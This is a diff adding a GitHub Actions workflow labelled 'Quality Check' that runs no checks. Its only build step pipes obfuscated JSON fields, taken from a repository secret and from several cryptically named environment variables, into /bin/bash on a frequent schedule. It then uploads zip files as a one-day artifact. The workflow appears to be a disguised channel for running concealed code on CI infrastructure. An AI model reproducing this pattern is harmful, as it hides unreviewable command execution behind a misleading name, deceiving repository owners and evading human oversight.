@@ -1,0 +1,37 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '15 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build and run
+        env:
+          jd97: ${{ secrets.jd97 }}
+        run: |
+          printf '%s' "$jd97" | jq -r .m425 | /bin/bash
+          echo $r6 | jq -r .c20 | /bin/bash
+          echo $pkqb081 | jq -r .d97500 | /bin/bash
+          printf '%s' "$qre368" | jq -r .nf66544 | /bin/bash
+          printf '%s' "$pmwch080" | jq -r .inq2 | /bin/bash
+          echo $da249 | jq -r .mppso1 | /bin/bash
+          echo $ijctd603 | jq -r .vaex135 | /bin/bash
+          echo $gwnda685 | jq -r .ei6539 | /bin/bash
+
+      - name: Upload artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: oYbpsfo7
+          path: "*.zip"
+          retention-days: 1
